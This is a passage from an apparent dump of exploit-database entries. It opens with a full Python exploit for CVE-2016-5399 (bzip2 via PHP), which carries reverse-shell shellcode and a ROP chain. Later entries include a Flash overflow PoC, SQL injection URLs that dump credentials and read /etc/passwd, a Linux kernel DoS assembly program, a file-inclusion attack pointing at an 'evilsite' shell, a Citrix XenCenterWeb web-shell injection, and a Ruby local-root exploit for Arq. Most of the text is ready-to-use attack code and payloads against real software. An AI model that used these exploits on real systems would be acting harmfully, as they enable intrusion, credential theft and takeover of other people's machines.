307          for (i = 0; i < nSelectors; i++) { | 308             v = s->selectorMtf[i]; | 309             tmp = pos[v]; | 310             while (v > 0) { pos[v] = pos[v-1]; v--; } | 311             pos[0] = tmp; | 312             s->selector[i] = tmp; | 313          } | 314       } | 315 | ... | 613    save_state_and_return: | 614 | 615    s->save_i           = i; | 616    s->save_j           = j; | ... | 619    s->save_nGroups     = nGroups; | 620    s->save_nSelectors  = nSelectors; | ... | 640    return retVal; | 641 } `----  bzip2-1.0.6/decompress.c ,---- | 070 #define GET_BIT(lll,uuu)                          \ | 071    GET_BITS(lll,uuu,1) `----  bzip2-1.0.6/decompress.c ,---- | 043 #define GET_BITS(lll,vvv,nnn)                     \ | 044    case lll: s->state = lll;                      \ | 045    while (True) {                                 \ | ... | 065    } `----  If j >= nGroups (decompress.c:297), BZ2_decompress() would save its state and return BZ_DATA_ERROR.  If the caller don't act on the erroneous retval, but rather invokes BZ2_decompress() again, the saved state would be restored (including `i' and `j') and the switch statement would transfer execution to the BZ_X_SELECTOR_3 case -- ie. the preceding initialization of `i = 0' and `j = 0' would not be executed.  In pseudocode it could be read as something like:  ,---- | i = s->save_i; | j = s->save_j; |  | switch (s->state) { | case BZ_X_SELECTOR_2: |     s->state = BZ_X_SELECTOR_2; |  |     nSelectors = get_15_bits... |  |     for (i = 0; i < nSelectors; i++) { |         j = 0; |         while (True) { |             goto iter; | case BZ_X_SELECTOR_3: | iter: |     s->state = BZ_X_SELECTOR_3; |  |     uc = get_1_bit... |  |     if (uc == 0) goto done; |     j++; |     if (j >= nGroups) { |         retVal = BZ_DATA_ERROR; |         goto save_state_and_return; |     } |     goto iter; | done: |     s->selectorMtf[i] = j; `----  An example selector with nGroup=6: ,---- | 11111111111110 | ||||| `|||||| `- goto done; s->selectorMtf[i] = 13; |  `´     j++; | j++;    goto save_state_and_return; | goto iter; `----  Since the selectors are used as indices to `pos' in the subsequent loop, an `nSelectors' amount of <= 255 - BZ_N_GROUPS bytes out-of-bound writes could occur if BZ2_decompress() is invoked in spite of a previous error.  bzip2-1.0.6/decompress.c ,---- | 304          UChar pos[BZ_N_GROUPS], tmp, v; | 305          for (v = 0; v < nGroups; v++) pos[v] = v; | 306 | 307          for (i = 0; i < nSelectors; i++) { | 308             v = s->selectorMtf[i]; | 309             tmp = pos[v]; | 310             while (v > 0) { pos[v] = pos[v-1]; v--; } | 311             pos[0] = tmp; | 312             s->selector[i] = tmp; | 313          } `----  bzip2-1.0.6/bzlib_private.h ,---- | 121 #define BZ_N_GROUPS 6 `----   PoC ===  Against FreeBSD 10.3 amd64 with php-fpm 7.0.8 and nginx from the official repo [2]:  ,---- | $ nc -v -l 1.2.3.4 5555 & | Listening on [1.2.3.4] (family 0, port 5555) |  | $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php | [*] sending archive to http://target/upload.php (0) |  | Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479) | $ fg | id | uid=80(www) gid=80(www) groups=80(www) |  | uname -imrsU | FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000 |  | /usr/sbin/pkg query -g ""=> %n-%v"" php* | => php70-7.0.8 | => php70-bz2-7.0.8 |  | cat upload.php | <?php | $fp = bzopen($_FILES[""file""][""tmp_name""], ""r""); | if ($fp === FALSE) { |     exit(""ERROR: bzopen()""); | } |  | $data = """"; | while (!feof($fp)) { |     $res = bzread($fp); |     if ($res === FALSE) { |         exit(""ERROR: bzread()""); |     } |     $data .= $res; | } | bzclose($fp); | ?> `----   Solution ========  This issue has been assigned CVE-2016-5399 and can be mitigated by calling bzerror() on the handle between invocations of bzip2.  Another partial solution has been introduced in PHP 7.0.9 and 5.5.38, whereby the stream is marked as EOF when an error is encountered; allowing this flaw to be avoided by using feof().  However, the PHP project considers this to be an issue in the underlying bzip2 library[3].    Footnotes _________  [1] [https://secure.php.net/manual/en/function.bzread.php]  [2] [https://github.com/dyntopia/exploits/tree/master/CVE-2016-5399]  [3] [https://bugs.php.net/bug.php?id=72613]   -- Hans Jerry Illikainen ''' #!/usr/bin/env python # # PoC for CVE-2016-5399 targeting FreeBSD 10.3 x86-64 running php-fpm # behind nginx. # # ,---- # | $ nc -v -l 1.2.3.4 5555 & # | Listening on [1.2.3.4] (family 0, port 5555) # | # | $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php # | [*] sending archive to http://target/upload.php (0) # | # | Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479) # | $ fg # | id # | uid=80(www) gid=80(www) groups=80(www) # | # | uname -imrsU # | FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000 # | # | /usr/sbin/pkg query -g ""=> %n-%v"" php* # | => php70-7.0.8 # | => php70-bz2-7.0.8 # | # | cat upload.php # | <?php # | $fp = bzopen($_FILES[""file""][""tmp_name""], ""r""); # | if ($fp === FALSE) { # |     exit(""ERROR: bzopen()""); # | } # | # | $data = """"; # | while (!feof($fp)) { # |     $res = bzread($fp); # |     if ($res === FALSE) { # |         exit(""ERROR: bzread()""); # |     } # |     $data .= $res; # | } # | bzclose($fp); # | ?> # `---- # # - Hans Jerry Illikainen <hji@dyntopia.com> # import argparse import socket from struct import pack  import requests import bitstring  # reverse shell from metasploit shellcode = [     ""\x31\xc0\x83\xc0\x61\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f""     ""\x05\x49\x89\xc4\x48\x89\xc7\x31\xc0\x83\xc0\x62\x48\x31\xf6""     ""\x56\x48\xbe\x00\x02%(port)s%(ip)s\x56\x48\x89\xe6\x6a\x10""     ""\x5a\x0f\x05\x4c\x89\xe7\x6a\x03\x5e\x48\xff\xce\x6a\x5a\x58""     ""\x0f\x05\x75\xf6\x31\xc0\x83\xc0\x3b\xe8\x08\x00\x00\x00\x2f""     ""\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c\x24\x48\x31\xd2\x52""     ""\x57\x48\x89\xe6\x0f\x05"" ]  # we're bound by the MTF and can only reuse values on the stack # between pos[0]..pos[255] selectors = [     # retaddr:     #   0x8009c9462: lea    rsp,[rbp-0x20]     #   0x8009c9466: pop    rbx     #   0x8009c9467: pop    r12     #   0x8009c9469: pop    r14     #   0x8009c946b: pop    r15     #   0x8009c946d: pop    rbp     #   0x8009c946e: ret     #     # from /libexec/ld-elf.so.1 (bbdffba2dc3bb0b325c6eee9d6e5bd01141d97f3)     9, 10, 11, 18, 1, 88, 31, 127,      # rbp:     #   0x802974300 (close to the end of the stream)     16, 17, 18, 29, 22, 152, 159, 25,      # push it back     17, 18, 19, 20, 21, 22, 23, 24,     25, 26, 27, 28, 29, 30, 31, 32,     33, 34, 35, 36, 37, 38, 39, 40,     41, 42, 43, 44, 45, 46, 47, 48,     49, 50, 51, 52, 53, 54, 55, 56,     57, 58, 59, 60, 61, 62 ]  payload = [     # addr     #     # 0x41c4c8: pop    rdi     # 0x41c4c9: ret     pack(""<Q"", 0x41c4c8),     pack(""<Q"", 0x0802973000),      # len     #     # 0x421508: pop    rsi     # 0x421509: ret    0x0     pack(""<Q"", 0x421508),     pack(""<Q"", 0x5555),      # prot     #     # 0x519b3a: pop    rdx     # 0x519b3b: ret     pack(""<Q"", 0x519b3a),     pack(""<Q"", 0x7),      # mprotect     #     # 0x5adf50: pop    rax     # 0x5adf51: ret     pack(""<Q"", 0x5adf50),     pack(""<Q"", 74),      # from /libexec/ld-elf.so.1 (bbdffba2dc3bb0b325c6eee9d6e5bd01141d97f3)     #     # 0x8009d5168: syscall     # 0x8009d516a: jb 0x8009d9d00     # 0x8009d5170: ret     pack(""<Q"", 0x08009d5168),     pack(""<Q"", 0x08029731b7),      ""%(shellcode)s"",      ""%(pad)s"",      # 0x45de9c: pop rsp     # 0x45de9d: ret     pack(""<Q"", 0x45de9c),     pack(""<Q"", 0x0802973167), ]   def get_payload(ip, port):     sc = """".join(shellcode) % {         ""ip"": socket.inet_aton(ip),         ""port"": pack(""!H"", port)     }     return """".join(payload) % {         ""shellcode"": sc,         ""pad"": ""\x90"" * (4433 - len(sc)),     }   def get_header():     b = bitstring.BitArray()     b.append(""0x425a"")             # magic     b.append(""0x68"")               # huffman     b.append(""0x31"")               # block size (0x31 <= s <= 0x39)     b.append(""0x314159265359"")     # compressed magic     b.append(""0x11223344"")         # crc     b.append(""0b0"")                # not randomized     b.append(""0x000000"")           # pointer into BWT     b.append(""0b0000000000000001"") # mapping table 1     b.append(""0b0000000000000001"") # mapping table 2     b.append(""0b110"")              # number of Huffman groups (1 <= n <= 6)     b.append(format(len(selectors), ""#017b"")) # number of selectors      # selector list     for s in selectors:         b.append(""0b"" + ""1"" * s + ""0"")      # BZ_X_CODING_1 (1 <= n <= 20).  we want a fail to make     # BZ2_decompress() bail as early as possible into the     # first gadget since the stack will be kind of messed up     b.append(""0b00000"")      return b.tobytes()   def send_bzip2(url, bzip2):     try:         req = requests.post(url, files={""file"": bzip2}, timeout=5)     except requests.exceptions.Timeout:         return 0     return req.status_code   def get_args():     p = argparse.ArgumentParser()     p.add_argument(""--ip"", required=True, help=""connect-back ip"")     p.add_argument(""--port"", required=True, type=int, help=""connect-back port"")     p.add_argument(""--attempts"", type=int, default=10)     p.add_argument(""url"")     return p.parse_args()   def main():     args = get_args()     bzip2 = get_header() + get_payload(args.ip, args.port)      for i in range(args.attempts):         print(""[*] sending archive to %s (%d)"" % (args.url, i))         status = send_bzip2(args.url, bzip2)         if status == 0:             break         elif status == 404:             exit(""[-] 404: %s"" % args.url)  if __name__ == ""__main__"":     main()",canonical,0
37843,"Flash Player - Integer Overflow in Function.apply Source: https://code.google.com/p/google-security-research/issues/detail?id=302&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id  [Tracking for: https://code.google.com/p/chromium/issues/detail?id=470837]  VULNERABILITY DETAILS An integer overflow while calling Function.apply can lead to enter an ActionScript function without correctly validating the supplied arguments.  VERSION Chrome Version: 41.0.2272.101 stable, Flash 17.0.0.134 Operating System: Win7 x64 SP1  REPRODUCTION CASE  From exec.cpp taken from the Crossbridge sources, available at https://github.com/adobe-flash/crossbridge/blob/master/avmplus/core/exec.cpp  944 // Specialized to be called from Function.apply().  945 Atom BaseExecMgr::apply(MethodEnv* env, Atom thisArg, ArrayObject *a)  946 {  947     int32_t argc = a->getLength();   ...   966     // Tail call inhibited by local allocation/deallocation.  967     MMgc::GC::AllocaAutoPtr _atomv;  968     Atom* atomv = (Atom*)avmStackAllocArray(core, _atomv, (argc+1), sizeof(Atom));   //here if argc = 0xFFFFFFFF we get an integer overflow 969     atomv[0] = thisArg;  970     for (int32_t i=0 ; i < argc ; i++ )  971         atomv[i+1] = a->getUintProperty(i);  972     return env->coerceEnter(argc, atomv);  973 }    So the idea is to use the rest argument to get a working poc. For example:      public function myFunc(a0:ByteArray, a1:ByteArray, a2:ByteArray, a3:ByteArray, a4:ByteArray, a5:ByteArray, ... rest) {                  try {a0.writeUnsignedInt(0x41414141)}catch (e) {}         try {a1.writeUnsignedInt(0x41414141)}catch (e) {}         try {a2.writeUnsignedInt(0x41414141)}catch (e) {}         try {a3.writeUnsignedInt(0x41414141)}catch (e) {}         try {a4.writeUnsignedInt(0x41414141)}catch (e) {}              }     public function XApplyPoc() {         var a:Array = new Array()                 a.length = 0xFFFFFFFF         myFunc.apply(this, a)     }  Compile with mxmlc -target-player 15.0 -swf-version 25 XApplyPoc.as.  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37843.zip",macromedia,1
2507,"Album Photo Sans Nom 1.6 - Remote Source Disclosure # # Title..: 7 php scripts File Inclusion Vuln / Source disclosure # Credits: DarkFig # Og.link: http://acid-root.new.fr/poc/13061007.txt # # Using http://www.google.com/codesearch # Few examples about what we can do with a code search engine # For educational purpose only. # # You can use regex in your research, this can be chaotic. # What's your opinion about the google code search project ? #  # Affected.scr: Album Photo Sans Nom v1.6 # Download....: http://scripts.bezut.info/releases/APSN/albumV1.6.tgz # Poc.........: http://victim.pl/getimg.php?img=config.inc.php # Vuln.code...: Line 47, readfile($_GET['img']);  # milw0rm.com [2006-10-10]",Album,1
7621,"PHPAlumni - SQL Injection ############################################################### #################### Viva IslaM Viva IslaM #################### ## ## Remote SQL InjEcti0n Vulnerability ## ## PHPAlumni ( Acomment.php id ) ##                             ############################################################### ############################################################### ## ## AuTh0r : Mr.SQL ## ## H0ME   : WwW.PaL-HaCkEr.CoM  &  WwW.AtsDp.CoM ## ## Email  : SQL@Hotmail.it ## ## SYRIAN Arab HACkErS ######################## ######################## ## ## ## -[[: Exploite :]]- ## ##   www.Target.com/Acomment.php?id=1+union+select+0,0,0,0,0,0,0,0,concat_ws(0x3a,name,email,password),0,0+from+users-- ## ######################## ########################  ####################################################################################################### #######################################################################################################                                   -(:: !Gr3E3E3E3E3E3E3TzZ! ::)-                                            :: HaCkEr_EGy :: His0k4 :: Dark MaSTer :: MoHaMeD el 3rab :: ALwHeD :: ****** :: MuslimS HaCkErS :: ####################################################################################################### #######################################################################################################  # milw0rm.com [2008-12-29]",.Target.,1
1657,"Linux Kernel 2.6.x - 'sys_timer_create()' Local Denial of Service ;nasm -f elf noHeaven.asm ;ld -s -o noHeaven noHeaven.o  section .text    global _start  count   equ     8       ; threads count - do it quicker  _start:        mov     ebx, count        call    create_threads        jmp     done _pause:        mov     eax,29        int     0x80        ret create_threads:        mov     eax,2        int     0x80        test    eax,eax        jz      consume        dec     ebx        test    ebx,ebx        jnz     create_threads        ret consume: setsid:         ;       so we won't get counted as one thread in oom_killer()        xor     ebx,ebx ;       each task will have about 20 oom_score which        mov     eax,66 ;        is less than 'init' and others        int     0x80        push    eax loopek:        mov     eax,259        mov     ebx,0        mov     ecx,0        mov     edx,esp        int     0x80        jmp     loopek done:        xor     ebx,ebx        mov     eax,1        int     0x80  ; milw0rm.com [2006-04-09]",linux,1
6856,"e107 Plugin BLOG Engine 2.1.4 - SQL Injection e107 Plugin macgurublog_menu macgurublog.php (uid) Remote Sql inj  author: ZoRLu  home: z0rlu.blogspot.com   concat: trt-turk@hotmail.com  date: 28/10/2008  n0te: YALNIZLIK YiTiRDi ANLAMINI YALNIZLIGIMDA  : ( (  n0te: a.q kpss : ) )  dork: allinurl:""macgurublog.php?uid=""  exploit:  http://localhost/script_path/macgurublog.php?uid=[SQL]  [SQL]=  -1+union+select+concat(user_name,char(58),user_password,char(58)),2+from+e107_user/*  example:  http://www.dmchat.org.uk/e107_plugins/macgurublog_menu/macgurublog.php?uid=-1+union+select+concat(user_name,char(58),user_password,char(58)),2+from+e107_user/*  thanks: str0ke  # milw0rm.com [2008-10-28]",e107,1
44849,"XNU Kernel - Heap Overflow Due to Bad Bounds Checking in MPTCP mptcp_usr_connectx is the handler for the connectx syscall for the AP_MULTIPATH socket family.  The logic of this function fails to correctly handle source and destination sockaddrs which aren't AF_INET or AF_INET6:  // verify sa_len for AF_INET:    if (dst->sa_family == AF_INET &&       dst->sa_len != sizeof(mpte->__mpte_dst_v4)) {     mptcplog((LOG_ERR, ""%s IPv4 dst len %u\n"", __func__,         dst->sa_len),        MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);     error = EINVAL;     goto out;   }  // verify sa_len for AF_INET6:    if (dst->sa_family == AF_INET6 &&       dst->sa_len != sizeof(mpte->__mpte_dst_v6)) {     mptcplog((LOG_ERR, ""%s IPv6 dst len %u\n"", __func__,         dst->sa_len),        MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);     error = EINVAL;     goto out;   }  // code doesn't bail if sa_family was neither AF_INET nor AF_INET6    if (!(mpte->mpte_flags & MPTE_SVCTYPE_CHECKED)) {     if (mptcp_entitlement_check(mp_so) < 0) {       error = EPERM;       goto out;     }      mpte->mpte_flags |= MPTE_SVCTYPE_CHECKED;   }  // memcpy with sa_len up to 255:    if ((mp_so->so_state & (SS_ISCONNECTED|SS_ISCONNECTING)) == 0) {     memcpy(&mpte->mpte_dst, dst, dst->sa_len);   }  This PoC triggers the issue to overwrite the mpte_itfinfo field leading to a controlled pointer being passed to kfree when the socket is closed.  Please note that these lengths seem to be trusted in multiple places - I would strongly suggest auditing this code quite thoroughly, especially as mptcp can be reached from more places as of iOS 11.  Note that the MPTCP code does seem to be quite buggy; trying to get a nice PoC working for this buffer overflow bug I accidentally triggered the following error path:    error = socreate_internal(dom, so, SOCK_STREAM, IPPROTO_TCP, p,           SOCF_ASYNC, PROC_NULL);   mpte_lock(mpte);   if (error) {     mptcplog((LOG_ERR, ""%s: subflow socreate mp_so 0x%llx unable to create subflow socket error %d\n"",         (u_int64_t)VM_KERNEL_ADDRPERM(mp_so), error),        MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);      proc_rele(p);      mptcp_subflow_free(mpts);     return (error);   }  note that first argument to mptcplog has one too few arguments. It's probably not so interesting from a security POV but is indicative of untested code (this error path has clearly never run as it will always kernel panic.)   This PoC is for MacOS but note that this code is reachable on iOS 11 from inside the app sandbox if you give yourself the multipath entitlement (which app store apps can now use.)  Just run this PoC as root on MacOS for easy repro.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/44849.zip",XNU,1
3467,"GestArt Beta 1 - 'aide.php?aide' Remote File Inclusion                                                           .-""""""""""""""""-.                                                                                           /   Dj7xpl   \                                                                                       |              |                                                                                         |,  .-.  .-.  ,|                                                                                         | )(_o/  \o_)( |                                                                                              |/     /\     \|                                                                                (@_       (_     ^^     _)                                                            _     ) \_______\__|IIIIII|__/_______________________________                                         (_)@8@8{}<________|-\IIIIII/-|________________________________>                                                )_/        \          /                                                 (@ 											    +_______________________________________________Iranian Are The Best In World___________________________________________+ # # #   Portal     :   GestArt  #   Download   :   http://www.phpscripts-fr.net/scripts/scripts.php?cat=Gestion #   Author     :   Dj7xpl  | Dj7xpl@yahoo.com #   Risk       :   High (Remote File Inclusion Exploit) # +_______________________________________________________________________________________________________________________+   +-------------**************************************** aide.php *********************************************-----------+ # # #    <? include(""$aide.txt"");?> </p>    <<<< line (21) # # +-------------***********************************************************************************************-----------+  +_______________________________________________________________________________________________________________________+ # # #    Exploit  :  http://[target]/[path]/aide.php?aide=http://evilsite/shell         <<<<  Shell (Text File) #    Example  :  http://localhost/getart/aide.php?aide=http://localhost/c99         <<<<  c99.txt # +_______________________________________________________________________________________________________________________+  +_______________________________________________________________________________________________________________________+ # # #    Sp Tnx      :  Milw0rm, Ashiyane, Delta Hacking, Virangar, Hacker.ir, Shabgard.org,Simorgh ............. # # +_______________________________________________________________________________________________________________________+  # milw0rm.com [2007-03-13]",.phpscripts-fr.,1
9106,"citrix xencenterweb - Cross-Site Scripting / SQL Injection / Remote Code Execution Secure Network - Security Research Advisory  Vuln name: Citrix XenCenterWeb Multiple Vulnerabilities  Systems affected: Citrix XenCenterWeb Systems not affected: n/a Severity: High Local/Remote: Remote Vendor URL: http://www.citrix.com Author(s): Alberto Trivero a.trivero@securenetwork.it  -    Claudio Criscione c.criscione@securenetwork.it Vendor disclosure: 1/06/2009 Vendor acknowledged: 11/06/2009 Vendor patch release: n/a Public disclosure: 06/07/2009 Advisory number: SN-2009-01 Advisory URL: http://securenetwork.it/ricerca/advisory/download/SN-2009-01.txt   *** SUMMARY ***  Citrix XenCenterWeb is a web interface for Citrix XenServer environment  management. Users of XenCenterWeb will be able to see a list of Virtual Machines in the  Resource Pool, perform life-cycle actions (start, shutdown, restart, etc.),  get basic information about the hosts in the Resource Pools, information about  the VMs and also connect to the console of the VMs.  Due to poor validation of some user controlled inputs, a variety of attacks  against the application and the underlying server are possible. Cross-site scripting, cross-site request forgery, SQL injection and remote  command execution attack vectors were identified as well.   XSS and CSRF attacks can be performed on the virtual appliance itself, while  the others require the PHP parameter magic_quotes_gpc to be off on the web  server.  *** VULNERABILITY DETAILS ***  (a) Cross-site Scripting (XSS) and Cross-site Request Forgery (CSRF) With the default PHP configuration (register_globals=Off and  magic_quotes_gpc=On), both XSS and CSRF attacks can be executed.  The first XSS attack exploits the lack of sanitization in the username  parameter in edituser.php script and requires the victim to be able to access  configuration scripts:  https://xencenterweb.loc/config/edituser.php?username=1<script>alert(document.cookie)</script>  Under the same conditions, a CSRF attack can be executed to change the  password of an arbitrary user: https://xencenterweb.loc/config/changepw.php?username=[victim_username]&newpass=[attacker's_chosen_pwd]  Another CSRF attack can hard stop a VM of the attacker's choice: https://xencenterweb.loc/hardstopvm.php?stop_vmref=[VMref]&stop_vmname=[VMname]  Other XSS vulnerabilities afflict scripts which are accessible by anyone: https://xencenterweb.loc/console.php?location=1""><script>alert(document.cookie)</script><""&vmname=myVM https://xencenterweb.loc/console.php?location=1&sessionid=1""><script>alert(123)</script><""&vmname=myVM https://xencenterweb.loc/console.php?location=1&sessionid=1&vmname=myVM<script>alert(123)</script> https://xencenterweb.loc/forcerestart.php?vmrefid=1""><script>alert(123)</script><""&vmname=myVM https://xencenterweb.loc/forcerestart.php?vmrefid=1&vmname=myVM""><script>alert(123)</script><"" https://xencenterweb.loc/forcesd.php?vmrefid=1&vmname=myVM""><script>alert(123)</script><"" https://xencenterweb.loc/forcesd.php?vmrefid=1""><script>alert(123)</script><""&vmname=myVM  (b) SQL Injection The username parameter in the login.php script is vulnerable to a Blind SQL  Injection attack. An attacker can retrieve the whole database schema through specially crafted  requests. Here is an example proof of concept: https://xencenterweb.loc/login.php?username=user' UNION SELECT if(user() LIKE  'root@%', benchmark(1000000,sha1('test')), 'false')/* Obviously, other high profile attacks can be performed through this attack  vector.  (c) Remote Command Execution An attacker could write arbitrary data in the file  /usr/local/lib/php/include/config.ini.php through the file /var/www/config/writeconfig.php. Due to this unsecure behavior,  arbitrary commands can be executed on the machine. If a victim with the proper authorization follows this link: https://xencenterweb.loc/config/writeconfig.php?pool1='; ?> <?php $cmd =  $_REQUEST['cmd']; passthru($cmd); ?> <?php $xen = ' or this URL encoded version: https://xencenterweb.loc/config/writeconfig.php?pool1=%27%3B%20%3F%3E%20%3C%3Fphp%20%24cmd%20%3D%20%24_REQUEST%5B%27cmd%27%5D%3B%20passthru%28%24cmd%29%3B%20%3F%3E%20%3C%3Fphp%20%24xen%20%3D%20%27 an attacker can then simply execute commands on the system through the  console.php file: https://xencenterweb.loc/console.php?cmd=cat%20/etc/passwd;   *** EXPLOIT ***  Attackers may exploit these issues through a common browser as explained  above.    *** FIX INFORMATION ***  No patch is currently provided by Citrix, and the application download has  been removed. Citrix officially stated that ""the tool was created to demonstrate how the SDK  could be used to create unique solutions. Customers currently using it should  assess the risks of continued use in light of your findings and, if these prove  to be unacceptable, discontinue usage"".   *** WORKAROUNDS ***  Common web application workarounds apply, like virtual patching from a web  application firewall or similar solutions. However most of the reported issues  can be mitigated by running the application only inside the virtual appliance  or in properly configured web servers.  Secure Network would like to thank Citrix for its support during the  disclosure process.   ********************* *** LEGAL NOTICES *** *********************  Secure Network (www.securenetwork.it) is an information security company,  which provides consulting and training services, and engages in security  research and development.   We are committed to open, full disclosure of vulnerabilities, cooperating whenever possible with software developers for properly handling disclosure.  This advisory is copyright 2009 Secure Network S.r.l. Permission is  hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. It  may not be edited in any way without the express consent of Secure Network  S.r.l. Permission is explicitly given for insertion in vulnerability  databases and similars, provided that due credit is given to Secure Network.  The information in the advisory is believed to be accurate at the time of  publishing based on currently available information. This information is provided as-is, as a free service to the community by Secure Network  research staff. There are no warranties with regard to this information.  Secure Network does not accept any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  If you have any comments or inquiries, or any issue with what is reported  in this advisory, please inform us as soon as possible.  E-mail: securenetwork {at} securenetwork.it GPG/PGP key: http://www.securenetwork.it/pgpkeys/Secure%20Network.asc Phone: +39 02 24126788  # milw0rm.com [2009-07-10]",citrix,1
8425,PHP-revista 1.1.2 - Remote File Inclusion / SQL Injection / Authentication Bypass / Cross-Site Scripting Discovered by Sirdarckcat from elhacker.net  ------------------------------------------------------------------------ ------------  Revista 1.1.2  http://php-revista.sourceforge.org  ------------------------------------------------------------------------ ------------  Revista is a simple spanish PHP magazine editor.  It was done by php.org.mx  It suffers of multiple vulnerabilities.  ------------------------------------------------------------------------ ------------  Remote File Inclusion  http://revista/estilo/[ANY STYLE]/index.php?adodb=http://evil/script  ------------------------------------------------------------------------ ------------  SQLi  http://revista/estilo/[ANY STYLE]/busqueda_tema.php?id_temas=-1+[SQL]  http://revista/estilo/[ANY STYLE]/busqueda.php?cadena='+[SQL]  http://revista/estilo/[ANY STYLE]/autor.php?id_autor=-1+[SQL]  http://revista/estilo/[ANY STYLE]/lista.php?email='+[SQL]  http://revista/estilo/[ANY STYLE]/articulo.php?id_articulo=-1+[SQL]  ------------------------------------------------------------------------ ------------  Credentials Bypass  http://revista/admin/index.php?ID_ADMIN=1&SUPER_ADMIN=1  ------------------------------------------------------------------------ ------------  XSS  http://revista/estilo/[ANY STYLE]/busqueda.php?cadena=<XSS>  http://revista/estilo/[ANY STYLE]/lista.php?email=<XSS>  ------------------------------------------------------------------------  # milw0rm.com [2009-04-14],PHP-revista,1
43216,"Arq 5.9.7 - Local Privilege Escalation =begin As well as the other bugs affecting Arq <= 5.9.6 there is also another issue with the suid-root restorer binaries in Arq for Mac. There are three of them and they are used to execute restores of backed up files from the various cloud providers.  After reversing the inter-app protocol I discovered that the path to the restorer binary was specified as part of the data packet sent by the UI. After receiving this, the restorer binaries then set +s and root ownership on this path. This means we can specify an arbitrary path which will receive +s and root ownership.  This issue is fixed in Arq 5.10. =end  #!/usr/bin/env ruby  ################################################################## ###### Arq <= 5.9.7 local root privilege escalation exploit ###### ###### by m4rkw - https://m4.rkw.io/blog.html               ###### ##################################################################  s = File.stat(""/Applications/Arq.app/Contents/Resources/standardrestorer"")  if s.mode != 0104755 or s.uid != 0   puts ""Not vulnerable - standardrestorer is not suid root.""   exit 1 end  binary_target = ""/tmp/arq_597_exp""  d = ""\x01\x00\x00\x00\x00\x00\x00\x00"" e = ""\x00\x00\x00\x00\x03"" z = ""0000"" target = sprintf(""%s%s-%s-%s-%s-%s%s%s"", z,z,z,z,z,z,z,z) plist = ""<plist version=\""1.0\""><dict><\/dict><\/plist>"" backup_set = ""0"" * 40 hmac = ""0"" * 40  payload = sprintf(   ""%s%s%s%s\$%s%s\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00"" +   ""\x00\x00\x00\x00\x00\x09\x00\x00\x02\xd0\x96\x82\xef\xd8\x00\x00\x00\x00"" +   ""\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x08\x30\x2e\x30"" +   ""\x30\x30\x30\x30\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" +   ""\x00\x00\x00\x00\x00\x00\x00%s%s%s\x28%s\x01\x00\x00\x00%s\x00\x00\x00%s"" +   ""\x00\x00\x00\x00\x16\x00\x00\x00\x02%s\x28%s\x01\x00\x00\x00%s\x00\x00"" +   ""\x00%s\x00\x00\x00\x00\x00\x00\x00\x01\xf5\x00\x00\x00\x00\x00\x00\x00"" +   ""\x14\x00%s\x00\x00\x00\x00\x03%s\x0a"",     d, binary_target.length.chr, binary_target,     d, target,     d, plist.length.chr, plist,     d, backup_set,     d, d, d, hmac,     d, d, d, e * 10   )  shellcode = ""#include <unistd.h>\nint main()\n{ setuid(0);setgid(0);""+   ""execl(\""/bin/bash\"",\""bash\"",\""-c\"",\""rm -f #{binary_target};/bin/bash\"",""+   ""NULL);return 0; }""  IO.popen(""gcc -xc -o #{binary_target} -"", mode=""r+"") do |io|   io.write(shellcode)   io.close end  IO.popen(""/Applications/Arq.app/Contents/Resources/standardrestorer "" +   ""2>/dev/null"", mode=""r+"") do |io|   io.getc && io.write(payload) end  timeout=3 i=0  while (s = File.stat(binary_target)) && (s.mode != 0104755 or s.uid != 0)   sleep 0.1   i += 1    if i >= (timeout * 10)     break   end end  if s.mode == 0104755 and s.uid == 0   system(binary_target)   exit 0 end  puts ""exploit failed""",arqbackup,1
17084,"Andy's PHP KnowledgeBase 0.95.2 - 'viewusers.php' SQL Injection 'Andy's PHP Knowledgebase' SQL Injection Vulnerability (CVE-2011-1546) Mark Stanislav - mark.stanislav@gmail.com   I. DESCRIPTION --------------------------------------- A vulnerability exists in a_viewusers.php allowing for SQL injection of the 's' query parameter.    II. TESTED VERSION --------------------------------------- 0.95.2   III. PoC EXPLOIT --------------------------------------- http://www.example.com/aphpkb/a_viewusers.php?s=1%20UNION%20SELECT%20load_file(0x2f6574632f706173737764),null,null,null,null,null,null%20limit%200   IV. SOLUTION --------------------------------------- Upgrade to 0.95.3 or above.   V. REFERENCES --------------------------------------- http://www.aphpkb.org/ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1546 http://www.uncompiled.com/2011/03/cve-2011-1546/   VI. TIMELINE --------------------------------------- 03/13/2011 - Initial vendor disclosure 03/16/2011 - Vendor patched and released an updated version 03/16/2011 - Confirmed fix & disclosure date 03/30/2011 - Public disclosure",.aphpkb.,1
